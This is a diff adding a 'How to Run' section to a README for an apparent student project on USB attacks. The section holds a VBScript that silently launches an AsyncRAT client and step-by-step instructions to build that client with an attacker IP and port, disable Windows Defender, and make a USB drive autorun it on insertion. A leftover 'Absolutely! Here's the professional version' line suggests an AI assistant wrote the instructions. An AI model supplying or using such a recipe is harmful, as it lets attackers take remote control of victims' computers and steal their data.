@@ -88,3 +88,54 @@ Software Updates: Regularly update antivirus and security software to detect new
 7. **Conclusion:**
 
 This project highlights the vulnerabilities associated with peripheral interfaces like USB devices. By understanding and demonstrating these threats, we emphasize the importance of user education and robust security measures.
+
+#HOW TO RUN:
+
+Absolutely! Here’s the professional version of the **HOW TO RUN** section for your README.md file:
+
+---
+
+## How to Run the Project
+
+### Prerequisites
+- **AsyncRAT**: Ensure you have the AsyncRAT software.
+- **AutoRunUSB Creator Tool**: Download and install this tool.
+
+### Setup Files
+```vbscript
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+
+Dim appPath
+appPath = "AsyncClient.exe"
+
+objShell.Run Chr(34) & appPath & Chr(34),1, False
+
+Set objShell = Nothing
+```
+
+### Steps to Create the RubberDucky USB
+1. **Install AsyncRAT:**
+   - Temporarily disable Windows Defender.
+   - Run the AsyncRAT software.
+
+2. **Create Build in AsyncRAT:**
+   - Right-click and select "Create Build."
+   - Enter the desired port and IP address of your network.
+   - Click on "Finish" to generate the client executable.
+
+3. **Prepare the USB Drive:**
+   - Copy the generated client executable to your chosen USB drive.
+   - Include the provided `.VBScript` file in the USB drive.
+
+4. **Configure AutoRunUSB:**
+   - Open the AutoRunUSB Creator Tool.
+   - Select the `.VBScript` file to run automatically upon USB insertion.
+   - Locate and select the USB drive from the dropdown menu.
+   - Click "Finish" to finalize the setup.
+
+5. **Finalize:**
+   - Unplug the USB drive. 
+   - Your RubberDucky USB is now ready to deploy.
+
+---
